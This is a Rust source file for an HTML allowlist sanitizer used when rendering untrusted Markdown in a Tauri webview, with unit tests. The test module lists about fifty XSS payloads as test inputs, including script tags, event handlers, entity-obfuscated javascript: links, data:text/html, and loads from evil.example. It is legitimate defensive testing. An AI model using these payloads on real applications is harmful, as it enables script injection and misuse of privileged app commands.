//! HTML written inside a Markdown document, let through as a fixed subset.
//!
//! A document is untrusted and the webview it renders into can call every
//! Tauri command, so this is a security boundary. The rule that keeps it one:
//! **no byte of the document reaches the output unescaped.** Each tag in the
//! output is written here, its name taken from a fixed list, its attributes
//! from a fixed list, every value decoded and escaped again. Whatever is not
//! on a list comes out as visible text, the way all raw HTML used to.
//!
//! It works tag by tag, not on a parsed tree, because the document's HTML
//! arrives in pieces with Markdown between them: `<details>`, a blank line,
//! Markdown, `</details>` is three separate events. A tree sanitizer would
//! close the `<details>` at the end of the first piece. The cost is that
//! tags need not balance; `close_all` bounds what an unclosed one can do.
//!
//! Not allowed, each for a reason: `id` / `name` (they can shadow the app's
//! own elements), `class` / `style` (the app's styles and layout), `data-*`
//! (`data-oxide-src` loads any local file), event handlers, `srcset`, and any
//! element with its own parsing rules (`script`, `style`, `svg`, `math`,
//! `textarea`, `template`, forms, frames).

use crate::util::html_escape;

/// Elements with no content and no closing tag.
const VOID: &[&str] = &["br", "col", "hr", "img", "wbr"];
/// Inline elements. An unclosed one is closed at the end of its block.
const INLINE: &[&str] = &[
    "a", "abbr", "b", "cite", "code", "del", "dfn", "em", "i", "ins", "kbd", "mark", "q", "rp",
    "rt", "ruby", "s", "samp", "small", "span", "strike", "strong", "sub", "sup", "tt", "u", "var",
];
/// Containers. These may stay open across Markdown, which is the point:
/// `<div align="center">` or `<details>` around ordinary Markdown blocks.
const BLOCK: &[&str] = &[
    "blockquote",
    "caption",
    "center",
    "colgroup",
    "dd",
    "details",
    "div",
    "dl",
    "dt",
    "figcaption",
    "figure",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "li",
    "ol",
    "p",
    "pre",
    "summary",
    "table",
    "tbody",
    "td",
    "tfoot",
    "th",
    "thead",
    "tr",
    "ul",
];
/// Removed without a trace, content kept: `<picture>` falls back to its
/// `<img>`, and `<source srcset>` would load a remote image ungated.
const DROPPED: &[&str] = &["picture", "source"];
/// Attributes kept on any allowed element. None of them carries a URL;
/// `href` and `src` are handled apart.
const ATTRS: &[&str] = &[
    "align", "alt", "colspan", "dir", "height", "lang", "open", "reversed", "rowspan", "span",
    "start", "title", "type", "valign", "value", "width",
];

fn known(list: &'static [&'static str], name: &str) -> Option<&'static str> {
    list.iter().copied().find(|t| *t == name)
}

struct RawTag {
    closing: bool,
    name: String,
    attrs: Vec<(String, String)>,
}

/// Write `raw` to `out` under the rule above. `open` is the stack of inline
/// elements the document has opened and not closed yet; it lives across
/// calls, because `<b>`, some text and `</b>` arrive separately. `img_src`
/// turns an image address into the attributes the renderer gives any image
/// (so a remote one is as inert here as in `![](…)`).
pub fn filter(
    raw: &str,
    open: &mut Vec<&'static str>,
    out: &mut String,
    img_src: &dyn Fn(&str) -> String,
) {
    let mut rest = raw;
    while let Some(lt) = rest.find('<') {
        push_text(out, &rest[..lt]);
        rest = &rest[lt..];
        if rest.starts_with("<!--") {
            // A comment is dropped. One that never ends takes the rest of
            // the piece with it, as it would in a browser.
            rest = rest.find("-->").map_or("", |end| &rest[end + 3..]);
            continue;
        }
        match parse_tag(rest) {
            Some((tag, len)) => {
                emit(&tag, &rest[..len], open, out, img_src);
                rest = &rest[len..];
            }
            // Not a tag (`a < b`, an unfinished `<img src="`): the `<` is text.
            None => {
                out.push_str("&lt;");
                rest = &rest[1..];
            }
        }
    }
    push_text(out, rest);
}

/// Close every inline element still open. Called at the end of each block:
/// the HTML parser re-opens an unclosed `<a href>` (and `<b>`, `<code>`, …)
/// in every block that follows, so without this one stray tag would turn
/// the rest of the document into a link.
pub fn close_all(open: &mut Vec<&'static str>, out: &mut String) {
    close_down_to(open, 0, out);
}

fn close_down_to(open: &mut Vec<&'static str>, keep: usize, out: &mut String) {
    while open.len() > keep {
        if let Some(name) = open.pop() {
            out.push_str(&format!("</{name}>"));
        }
    }
}

/// More attributes than any real tag carries. Past it the text is not
/// treated as a tag, which also bounds the work one `<` can cost.
const MAX_ATTRS: usize = 64;

/// One tag at the start of `s` (which starts with `<`), and its length.
/// `None` when the text is not a complete, well-formed tag. It never reads
/// past the next `<`, a quoted value aside, so a long run of unfinished
/// tags is not rescanned from each one.
fn parse_tag(s: &str) -> Option<(RawTag, usize)> {
    let b = s.as_bytes();
    let mut i = 1;
    let closing = b.get(i) == Some(&b'/');
    if closing {
        i += 1;
    }
    let start = i;
    while i < b.len() && b[i].is_ascii_alphanumeric() {
        i += 1;
    }
    // `<my-tag>` or `<a:b>` is some other element, not the one its first
    // letters spell.
    if !b.get(start)?.is_ascii_alphabetic()
        || !matches!(*b.get(i)?, b'>' | b'/' | b' ' | b'\t' | b'\n' | b'\r')
    {
        return None;
    }
    let name = s[start..i].to_ascii_lowercase();
    let mut attrs = Vec::new();
    loop {
        while i < b.len() && (b[i].is_ascii_whitespace() || b[i] == b'/') {
            i += 1;
        }
        if *b.get(i)? == b'>' {
            return Some((
                RawTag {
                    closing,
                    name,
                    attrs,
                },
                i + 1,
            ));
        }
        if attrs.len() == MAX_ATTRS {
            return None;
        }
        let name_start = i;
        while i < b.len()
            && !(b[i].is_ascii_whitespace()
                || matches!(b[i], b'=' | b'>' | b'/' | b'"' | b'\'' | b'<'))
        {
            i += 1;
        }
        if i == name_start {
            return None; // a quote or a `<` where a name belongs
        }
        let attr = s[name_start..i].to_ascii_lowercase();
        while i < b.len() && b[i].is_ascii_whitespace() {
            i += 1;
        }
        let mut value = "";
        if b.get(i) == Some(&b'=') {
            i += 1;
            while i < b.len() && b[i].is_ascii_whitespace() {
                i += 1;
            }
            match *b.get(i)? {
                quote @ (b'"' | b'\'') => {
                    let end = i + 1 + s[i + 1..].find(quote as char)?;
                    value = &s[i + 1..end];
                    i = end + 1;
                }
                _ => {
                    let value_start = i;
                    while i < b.len() && !(b[i].is_ascii_whitespace() || b[i] == b'>') {
                        // An unquoted value holding one of these is a
                        // mistake in the source, not a tag to rewrite.
                        if matches!(b[i], b'<' | b'"' | b'\'' | b'=' | b'`') {
                            return None;
                        }
                        i += 1;
                    }
                    value = &s[value_start..i];
                }
            }
        }
        attrs.push((attr, value.to_string()));
    }
}

fn emit(
    tag: &RawTag,
    source: &str,
    open: &mut Vec<&'static str>,
    out: &mut String,
    img_src: &dyn Fn(&str) -> String,
) {
    if DROPPED.contains(&tag.name.as_str()) {
        return;
    }
    let inline = known(INLINE, &tag.name);
    let Some(name) = inline
        .or_else(|| known(BLOCK, &tag.name))
        .or_else(|| known(VOID, &tag.name))
    else {
        // Anything else stays what it always was: text the reader can see.
        out.push_str(&html_escape(source));
        return;
    };

    if tag.closing {
        if inline.is_some() {
            // Close down to the matching opener; with none, drop the tag.
            if let Some(at) = open.iter().rposition(|t| *t == name) {
                close_down_to(open, at, out);
            }
        } else if !VOID.contains(&name) {
            out.push_str(&format!("</{name}>"));
        }
        return;
    }

    out.push('<');
    out.push_str(name);
    // A link whose address was refused keeps its text and says so, the way
    // a Markdown link with a refused address does.
    let mut blocked = false;
    for (n, (attr, value)) in tag.attrs.iter().enumerate() {
        // The first of a repeated attribute is the one a browser keeps.
        if tag.attrs[..n].iter().any(|(earlier, _)| earlier == attr) {
            continue;
        }
        match (name, attr.as_str()) {
            ("a", "href") => match safe_url(value, &["http", "https", "mailto"]) {
                Some(url) => out.push_str(&format!(" href=\"{}\"", escape_attr(&url))),
                None => blocked = true,
            },
            ("img", "src") => {
                // Only an image may be inlined; `data:text/html` is not one.
                let image = safe_url(value, &["http", "https", "data"]).filter(|url| {
                    let lower = url.to_ascii_lowercase();
                    !lower.starts_with("data:") || lower.starts_with("data:image/")
                });
                if let Some(url) = image {
                    out.push_str(&img_src(&url));
                }
            }
            (_, plain) if ATTRS.contains(&plain) => {
                out.push_str(&format!(" {plain}=\"{}\"", escape_attr(&decode(value))));
            }
            _ => {}
        }
    }
    match name {
        // The classes the app's link handling and styles key off.
        "a" if blocked => out.push_str(" class=\"md-link md-link-blocked\""),
        "a" => out.push_str(" class=\"md-link\""),
        "img" => out.push_str(" loading=\"lazy\""),
        _ => {}
    }
    out.push('>');
    if inline.is_some() {
        open.push(name);
    }
}

/// The address a browser would actually follow, if it is one we allow.
///
/// The value is decoded first and written back fully escaped, so what is
/// checked here is exactly what the browser will read: an address spelled
/// `&#106;avascript&#58;…` has no literal colon to look for otherwise. A
/// browser also drops tabs and newlines from anywhere in an address, and
/// spaces and control characters from its ends. After that the address is
/// either relative or starts with a scheme from `schemes`.
fn safe_url(value: &str, schemes: &[&str]) -> Option<String> {
    let url: String = decode(value)
        .chars()
        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
        .collect();
    let url = url.trim_matches(|c: char| c <= ' ');
    if let Some(colon) = url.find(':') {
        let scheme = &url[..colon];
        let is_scheme = scheme.starts_with(|c: char| c.is_ascii_alphabetic())
            && scheme
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'));
        if is_scheme && !schemes.contains(&scheme.to_ascii_lowercase().as_str()) {
            return None;
        }
    }
    Some(url.to_string())
}

/// Decode the character references that can spell markup or an address:
/// numeric ones, with or without their semicolon, and the five basic named
/// ones. Any other `&` is a literal ampersand, and since the result is
/// escaped again on the way out, the browser reads it as one too.
fn decode(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    let mut rest = value;
    while let Some(amp) = rest.find('&') {
        out.push_str(&rest[..amp]);
        rest = &rest[amp..];
        let (ch, len) = reference(rest);
        out.push(ch);
        rest = &rest[len..];
    }
    out.push_str(rest);
    out
}

/// The character a reference at the start of `s` stands for and how many
/// bytes it takes, or a literal `&`.
fn reference(s: &str) -> (char, usize) {
    for (name, ch) in [
        ("&amp;", '&'),
        ("&lt;", '<'),
        ("&gt;", '>'),
        ("&quot;", '"'),
        ("&apos;", '\''),
    ] {
        if s.starts_with(name) {
            return (ch, name.len());
        }
    }
    if let Some(number) = s.strip_prefix("&#") {
        let (digits, radix) = match number.strip_prefix(['x', 'X']) {
            Some(hex) => (hex, 16),
            None => (number, 10),
        };
        let n = digits
            .bytes()
            .take_while(|b| (*b as char).is_digit(radix))
            .count();
        let ch = u32::from_str_radix(&digits[..n], radix)
            .ok()
            .and_then(char::from_u32);
        if let Some(ch) = ch {
            let semicolon = usize::from(digits[n..].starts_with(';'));
            return (ch, s.len() - digits.len() + n + semicolon);
        }
    }
    ('&', 1)
}

fn escape_attr(s: &str) -> String {
    html_escape(s).replace('\'', "&#39;")
}

/// Text between tags. A well-formed character reference is kept, so
/// `&nbsp;` and `&copy;` still work (in text it can only ever be a
/// character); any other `&` is an ampersand.
fn push_text(out: &mut String, text: &str) {
    let mut rest = text;
    while let Some(amp) = rest.find('&') {
        out.push_str(&html_escape(&rest[..amp]));
        rest = &rest[amp..];
        let end = rest[1..]
            .find(|c: char| !(c.is_ascii_alphanumeric() || c == '#'))
            .map_or(rest.len(), |e| e + 1);
        if end > 1 && rest[end..].starts_with(';') {
            out.push_str(&rest[..=end]);
            rest = &rest[end + 1..];
        } else {
            out.push_str("&amp;");
            rest = &rest[1..];
        }
    }
    out.push_str(&html_escape(rest));
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(raw: &str) -> String {
        let mut out = String::new();
        let mut open = Vec::new();
        filter(raw, &mut open, &mut out, &|src| {
            format!(" data-test-src=\"{}\"", escape_attr(src))
        });
        close_all(&mut open, &mut out);
        out
    }

    /// Every tag in `html`, as (name, attribute names). Panics on anything
    /// that is not a tag this module could have written, which is the rule
    /// the module exists to keep.
    fn tags(html: &str) -> Vec<(String, Vec<String>)> {
        let mut found = Vec::new();
        let mut rest = html;
        while let Some(lt) = rest.find('<') {
            rest = &rest[lt..];
            let (tag, len) =
                parse_tag(rest).unwrap_or_else(|| panic!("a stray `<` in the output: {html}"));
            assert!(
                known(INLINE, &tag.name)
                    .or_else(|| known(BLOCK, &tag.name))
                    .or_else(|| known(VOID, &tag.name))
                    .is_some(),
                "<{}> is not an allowed element: {html}",
                tag.name
            );
            for (attr, value) in &tag.attrs {
                let allowed = ATTRS.contains(&attr.as_str())
                    || matches!(
                        (tag.name.as_str(), attr.as_str()),
                        ("a", "href" | "class") | ("img", "data-test-src" | "loading")
                    );
                assert!(allowed, "{attr} on <{}> is not allowed: {html}", tag.name);
                assert!(
                    !value.contains(['<', '>', '"']),
                    "an unescaped value in {attr}: {html}"
                );
            }
            found.push((tag.name, tag.attrs.into_iter().map(|(a, _)| a).collect()));
            rest = &rest[len..];
        }
        found
    }

    #[test]
    fn hostile_input_never_yields_anything_off_the_lists() {
        for raw in [
            "<script>alert(1)</script>",
            "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
            "<img src=x onerror=\"alert(1)\">",
            "<img src=\"x\" OnError=alert(1) onload = 'alert(2)'>",
            "<a href=\"javascript:alert(1)\">x</a>",
            "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
            "<a href=\" \u{1}javascript:alert(1)\">x</a>",
            "<a href=\"java\tscript:alert(1)\">x</a>",
            "<a href=\"java&#10;script:alert(1)\">x</a>",
            "<a href=\"&#106;avascript&#58;alert(1)\">x</a>",
            "<a href=\"&#x6A;avascript&#x3a;alert(1)\">x</a>",
            "<a href=\"&#106avascript&#58alert(1)\">x</a>",
            "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
            "<a href=\"vbscript:msgbox(1)\">x</a>",
            "<a href=\"file:///etc/passwd\">x</a>",
            "<img src=\"data:text/html,<script>alert(1)</script>\">",
            "<img src=\"javascript:alert(1)\">",
            "<img srcset=\"https://evil.example/t.png 1x\" src=\"a.png\">",
            "<picture><source srcset=\"https://evil.example/t.png\"><img src=\"a.png\"></picture>",
            "<img data-oxide-src=\"/etc/passwd\" data-oxide-remote-src=\"https://evil.example\">",
            "<div id=\"settings-save\" name=\"x\" class=\"hidden\" style=\"position:fixed\">x</div>",
            "<div data-code=\"x\" data-source-line=\"1\" contenteditable>x</div>",
            "<svg onload=alert(1)><script>alert(1)</script></svg>",
            "<math><mtext></mtext></math>",
            "<style>*{display:none}</style>",
            "<textarea></textarea><template><b>x</b></template>",
            "<iframe src=\"https://evil.example\"></iframe><object data=x></object><embed src=x>",
            "<form action=\"https://evil.example\"><input name=q><button>go</button></form>",
            "<base href=\"https://evil.example/\"><link rel=stylesheet href=x><meta http-equiv=refresh content=0>",
            "<b title=\"x\" onclick=\"alert(1)\">x</b>",
            "<b title=\"&quot;><script>alert(1)</script>\">x</b>",
            "<b title='\"><script>alert(1)</script>'>x</b>",
            "<b title=\"x\" title=\"y\" onmouseover=alert(1)>x</b>",
            "<b <script>alert(1)</script>>x</b>",
            "<b\"><script>alert(1)</script>",
            "<img src=\"unterminated",
            "<a href='unterminated",
            "<!-- <script>alert(1)</script> -->shown",
            "<!-- never closed <script>alert(1)</script>",
            "<![CDATA[<script>alert(1)</script>]]>",
            "<!DOCTYPE html><html><body onload=alert(1)>",
            "<a-b href=\"javascript:alert(1)\">x</a-b>",
            "<a:b href=\"javascript:alert(1)\">x</a:b>",
            "</script><script>alert(1)</script>",
            "<<b>x</b>",
            "<b>&lt;script&gt;alert(1)&lt;/script&gt;</b>",
            "< script>alert(1)</ script>",
            "<img/src=x/onerror=alert(1)>",
            "<a href=\"x\"href=\"javascript:alert(1)\">x</a>",
        ] {
            let out = run(raw);
            for (name, attrs) in tags(&out) {
                assert!(!attrs.iter().any(|a| a.starts_with("on")), "{raw} -> {out}");
                assert_ne!(name, "script", "{raw} -> {out}");
            }
            let lower = out.to_ascii_lowercase();
            for scheme in ["javascript:", "vbscript:", "file:", "data:text"] {
                let live = format!("=\"{scheme}");
                assert!(!lower.contains(&live), "{raw} -> {out}");
            }
        }
    }

    #[test]
    fn a_disallowed_tag_is_shown_as_text() {
        assert_eq!(
            run("<script>alert(1)</script>"),
            "&lt;script&gt;alert(1)&lt;/script&gt;"
        );
        assert_eq!(run("a < b and c > d"), "a &lt; b and c &gt; d");
    }

    #[test]
    fn allowed_markup_comes_through_rewritten() {
        assert_eq!(run("<kbd>Ctrl</kbd>"), "<kbd>Ctrl</kbd>");
        assert_eq!(run("line<br/>line<BR>"), "line<br>line<br>");
        assert_eq!(run("<p align=center>x</p>"), "<p align=\"center\">x</p>");
        assert_eq!(
            run("<details open><summary>More</summary>"),
            "<details open=\"\"><summary>More</summary>"
        );
        assert_eq!(
            run("<td colspan='2' valign=top>x</td>"),
            "<td colspan=\"2\" valign=\"top\">x</td>"
        );
        assert_eq!(
            run("&copy; &nbsp; &#169; AT&T &"),
            "&copy; &nbsp; &#169; AT&amp;T &amp;"
        );
    }

    #[test]
    fn links_keep_only_followable_addresses() {
        assert_eq!(
            run("<a href=\"https://example.com/?a=1&b=2\">x</a>"),
            "<a href=\"https://example.com/?a=1&amp;b=2\" class=\"md-link\">x</a>"
        );
        assert_eq!(
            run("<a href=\"https://example.com/?a=1&amp;b=2\">x</a>"),
            "<a href=\"https://example.com/?a=1&amp;b=2\" class=\"md-link\">x</a>"
        );
        assert_eq!(
            run("<a href=\"docs/a b.md#top\">x</a>"),
            "<a href=\"docs/a b.md#top\" class=\"md-link\">x</a>"
        );
        assert_eq!(
            run("<a href=\"mailto:a@example.com\">x</a>"),
            "<a href=\"mailto:a@example.com\" class=\"md-link\">x</a>"
        );
        // A relative path may hold a colon after its first slash.
        assert_eq!(
            run("<a href=\"a/b:c\">x</a>"),
            "<a href=\"a/b:c\" class=\"md-link\">x</a>"
        );
        assert_eq!(
            run("<a href=\"javascript:alert(1)\">x</a>"),
            "<a class=\"md-link md-link-blocked\">x</a>"
        );
    }

    #[test]
    fn an_image_address_goes_through_the_renderer() {
        assert_eq!(
            run("<img src=\"https://example.com/a.png\" width=\"40\" alt=\"A\">"),
            "<img data-test-src=\"https://example.com/a.png\" width=\"40\" alt=\"A\" loading=\"lazy\">"
        );
        assert_eq!(
            run("<img src=\"data:image/png;base64,AAAA\">"),
            "<img data-test-src=\"data:image/png;base64,AAAA\" loading=\"lazy\">"
        );
        assert_eq!(
            run("<img src=\"data:text/html,x\">"),
            "<img loading=\"lazy\">"
        );
    }

    #[test]
    fn unclosed_inline_elements_end_with_the_piece() {
        assert_eq!(
            run("<a href=\"x\"><b>open"),
            "<a href=\"x\" class=\"md-link\"><b>open</b></a>"
        );
        // A closer with no opener is dropped; one that skips a level closes it.
        assert_eq!(run("x</b></a>"), "x");
        assert_eq!(run("<b><i>x</b>y"), "<b><i>x</i></b>y");
        // Containers are left as written: Markdown may sit inside them.
        assert_eq!(run("<div align=\"center\">"), "<div align=\"center\">");
        assert_eq!(run("</div></details>"), "</div></details>");
    }

    #[test]
    fn pathological_input_is_linear() {
        // Each of these made the filter rescan or compare quadratically.
        let started = std::time::Instant::now();
        for unit in ["<div x=v ", "<div x=v", "<a b=\"", " a"] {
            let mut raw = String::from("<div");
            raw.push_str(&unit.repeat(40_000));
            let _ = run(&raw);
            raw.push('>');
            let out = run(&raw);
            let _ = tags(&out);
        }
        assert!(
            started.elapsed() < std::time::Duration::from_secs(5),
            "took {:?}",
            started.elapsed()
        );
    }

    #[test]
    fn a_tag_can_span_lines() {
        assert_eq!(
            run("<img\n  src=\"https://example.com/a.png\"\n  width=\"10\"\n>"),
            "<img data-test-src=\"https://example.com/a.png\" width=\"10\" loading=\"lazy\">"
        );
    }
}
